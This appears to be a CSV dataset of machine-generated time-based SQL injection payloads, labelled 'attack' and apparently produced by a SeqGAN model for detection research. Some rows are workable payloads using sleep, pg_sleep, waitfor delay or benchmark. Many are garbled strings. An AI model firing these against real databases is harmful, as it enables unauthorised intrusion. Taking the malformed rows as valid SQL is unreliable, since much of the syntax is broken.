label,payload,family,payload_type,method,run_id,sample_index
attack,"""1'   )    )    )    )    )    )    or sleep  (  5   )    )    )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,0
attack,or sleep  (  __TIME______TIME___  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1
attack,"1%%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,2
attack,1'   )    )    )    or information_schema.chdk 8781  (  select elo  )    =  ' from pg_sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,3
attack,;waitfor delay '0:0:10'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,4
attack,select sleep  (  __TIME_____TIME______TIME__)  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,5
attack, or benchmark  (  0x694a4745   and    (    )    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,6
attack,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""c' where 5702  =  3114 andwaitfor frome fromualr  )   then from pg_sleep  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,7
attack,", or sleep  (  5  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,8
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""'  )     ),1 or sleep  (  )    )    )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,9
attack,ctsiq  =  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,10
attack,"1%""   )    )    <> 0  )    )   )    )    )    as sphdve where 5702 delay 8036  (  '_  sleep__  select___TIME__)  IME____)    )    =    _____TIME__  ),--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,11
attack,1' where =  6272 from   )    (    )    )    _)    svydqd1-1   'isintegratedsecurityonly'   select waitfor 9443sleep  (  5  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,12
attack,"1%%""<> where if not  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,13
attack,"""  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,14
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,15
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,16
